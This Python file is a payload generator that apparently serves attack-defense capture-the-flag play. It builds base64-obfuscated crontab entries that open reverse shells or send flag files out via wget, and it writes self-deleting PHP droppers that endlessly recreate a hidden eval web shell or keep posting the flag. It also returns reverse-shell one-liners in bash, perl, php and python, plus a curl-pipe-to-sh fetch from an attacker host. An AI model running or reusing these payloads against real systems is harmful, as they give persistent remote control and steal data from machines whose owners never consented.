import base64


def crontab_reverse_shell(ip, port, command=None) -> str:
    command = command or f'/bin/sh -c \'/bin/sh -i >&/dev/tcp/{ip}/{port} 0>&1\''

    cron = f'* * * * * {command}\n'
    cron = base64.b64encode(cron.encode()).decode()
    cmd = 'echo ' + cron + ' | base64 -d >> /tmp/t.conf; crontab /tmp/t.conf'
    return cmd


def crontab_submit_flag(flag_url, token, flag_path) -> str:
    command = f'wget "{flag_url}" -d "token={token}&answer=`cat {flag_path}`" '

    cron = f'* * * * * {command}\n'
    cron = base64.b64encode(cron.encode()).decode()
    cmd = 'echo ' + cron + ' | base64 -d >> /tmp/t.conf; crontab /tmp/t.conf'
    return cmd


def no_die_webshell(path=None) -> str:
    path = path or '/var/www/html'

    content = ('<?php '
               'ignore_user_abort(true);'
               'set_time_limit(0);'
               'unlink(__FILE__);'
               '$file=\'./.aiiod.php\';'
               '$code=\'<?php @eval($_REQUEST[aiiod]); ?>\';'
               'while (1){'
               'file_put_contents($file,$code);'
               'usleep(5000);'
               '}?>')

    content = base64.b64encode(content.encode()).decode()
    cmd = 'echo ' + content + f' | base64 -d > {path}/.nodie.php'
    return cmd


def php_auto_submit_flag(flag_url, token, flag_path, path=None) -> str:
    path = path or '/var/www/html'

    content = (
        '<?php '
        'ignore_user_abort(true);'
        'set_time_limit(0);'
        'unlink(__FILE__);'
        'while (true) {'
        f'$flag=file_get_contents(\'{flag_path}\');'
        f'if (!$flag) $flag=shell_exec(\'cat {flag_path}\');'
        '$flag=trim($flag);'
        f'system(\'wget "{flag_url}" -d "token={token}&answer=`cat {flag_path}`"\');'
        'sleep(5);}?>')

    content = base64.b64encode(content.encode()).decode()
    cmd = 'echo ' + content + f' | base64 -d > {path}/.flag.php'
    return cmd


def bash_reverse_shell(ip, port) -> str:
    cmd = f'nohup /bin/bash -c \'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\''
    return cmd


def perl_reverse_shell(ip, port) -> str:
    cmd = """nohup perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (
        ip, port)

    return cmd


def php_reverse_shell(ip, port) -> str:
    cmd = """nohup php -r '$sock=fsockopen("%s","%s");exec("/bin/sh -i <&3 >&3 2>&3");' &""" % (
        ip, port)
    return cmd


def python_reverse_shell(ip, port) -> str:
    cmd = """nohup python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'""" % (
        ip, port)
    return cmd


def platypus_reverse_shell(ip, port) -> str:
    cmd = f"""curl http://{ip}:{port}/{ip}/{port}|sh"""
    return cmd